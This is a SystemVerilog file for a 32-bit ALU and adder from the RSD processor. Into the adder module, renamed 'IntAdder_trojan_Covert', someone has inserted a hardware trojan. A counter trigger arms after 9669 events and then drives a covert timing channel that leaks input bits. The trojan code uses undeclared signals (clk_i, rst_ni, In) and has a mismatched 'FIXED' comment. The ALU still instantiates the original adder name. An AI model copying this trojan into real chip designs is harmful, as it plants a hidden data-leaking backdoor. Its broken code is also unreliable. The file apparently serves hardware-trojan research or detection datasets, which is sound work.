// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// 32bit ARM ALU
//


import BasicTypes::*;
import MicroOpTypes::*;
import OpFormatTypes::*;
import PipelineTypes::*;


typedef struct packed 
{
    logic    carry;
    DataPath data;
} IntAdderResult;


// 加算機
// inv がアサートされたオペランドはビット反転を行う
module IntAdder_trojan_Covert(
output 
    IntAdderResult dst,
    logic overflowOut,
input
    DataPath srcA, logic invA,
    DataPath srcB, logic invB,
    logic carryIn
);

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 9669;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (In && |In) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

        // COVERT CHANNEL: Timing modulation
        logic       covert_bit_out;
        logic [7:0] covert_delay_counter;
        logic [4:0] covert_bit_index;
        logic       current_bit;

        assign current_bit = In[covert_bit_index];  // <-- FIXED: use trigger_signal

        always_ff @(posedge clk_i or negedge rst_ni) begin
            if (!rst_ni) begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end else if (trojan_active) begin
                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
                    covert_delay_counter <= covert_delay_counter + 1;
                    covert_bit_out       <= 1'b1;
                end else begin
                    covert_bit_out       <= 1'b0;
                    covert_delay_counter <= '0;
                    covert_bit_index     <= covert_bit_index + 1;
                end
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end
        end
    
    function automatic DataPath Inv(
        input DataPath src, logic inv
    );
        return inv ? ~src : src;
    endfunction

    DataPath tmpA, tmpB;
    always_comb begin
        tmpA = Inv( srcA, invA );
        tmpB = Inv( srcB, invB );
        dst  = tmpA + tmpB + carryIn;
        overflowOut =
            ( dst.data[DATA_WIDTH-1] ^ tmpA[DATA_WIDTH-1] ) &&
            ( dst.data[DATA_WIDTH-1] ^ tmpB[DATA_WIDTH-1] );
    end
endmodule


module IntALU(
    output
        DataPath aluDataOut,
    input 
        IntALU_Code aluCode,
        DataPath fuOpA_In,
        DataPath fuOpB_In
);
    
    IntAdderResult opDst;
    
    
    DataPath opA;
    DataPath opB;
    SignedDataPath signedOpA;
    SignedDataPath signedOpB;
    
    IntAdderResult adderDst;
    DataPath adderInA; logic adderInvInA;
    DataPath adderInB; logic adderInvInB;
    logic    adderInCarry;
    logic    adderOutOverflow;
    
    IntAdder adder(
        .dst(adderDst),
        .srcA(adderInA),
        .invA(adderInvInA),
        .srcB(adderInB),
        .invB(adderInvInB),
        .carryIn(adderInCarry),
        .overflowOut(adderOutOverflow)
    );

    `define Add( a, ia, b, ib, c ) begin \
        adderInA     = a;  \
        adderInvInA  = ia; \
        adderInB     = b;  \
        adderInvInB  = ib; \
        adderInCarry = c;  \
        opDst        = adderDst; \
    end \
    
    `define Logic( a ) begin \
        adderInA     = '0;  \
        adderInvInA  = FALSE; \
        adderInB     = '0;  \
        adderInvInB  = FALSE; \
        adderInCarry = 0;  \
        opDst        = { 1'b0, (a) }; \
    end \


    // Operation
    always_comb begin
        
        opA     = fuOpA_In;
        opB     = fuOpB_In;
        signedOpA = '0;
        signedOpB = '0;
        
        case( aluCode )
            // AND  論理積
            default: `Logic( opA & opB )
            
            // EOR  排他的論理和
            AC_EOR: `Logic( opA ^ opB )
            
            // SUB  減算
            // a - b = a + ~b + 1
            AC_SUB: `Add( opA, FALSE, opB, TRUE, 1  )   
            
            // ADD  加算
            AC_ADD: `Add( opA, FALSE, opB, FALSE, 0 )       
            
            // SLT  比較   Rd = if Rs1 < Rs2 then 1 else 0
            AC_SLT : begin
                signedOpA = opA;
                signedOpB = opB;
                `Logic( { 31'h0, ( signedOpA < signedOpB) } )
            end
            // SLTU  符号なし比較
            AC_SLTU: `Logic( { 31'h0, ( opA < opB ) } )
            
            // ORR  （包含的）論理和    Rd := Rn OR shifter_operand
            AC_ORR: `Logic( opA | opB )

`ifdef RSD_ENABLE_ZBA
            // sh1add
            AC_SH1ADD: `Add( opA << 1, FALSE, opB, FALSE, 0 )
            // sh2add
            AC_SH2ADD: `Add( opA << 2, FALSE, opB, FALSE, 0 )
            // sh3add
            AC_SH3ADD: `Add( opA << 3, FALSE, opB, FALSE, 0 )
`endif

`ifdef RSD_ENABLE_ZICOND
            // czero.eqz
            AC_EQZ: `Logic( { ( opB  == 32'h0) ? 32'h0 : opA} )

            // czero.nez
            AC_NEZ: `Logic( { ( opB  != 32'h0) ? 32'h0 : opA} )
`endif

        endcase

        aluDataOut   = opDst.data;
    end
    


endmodule : IntALU
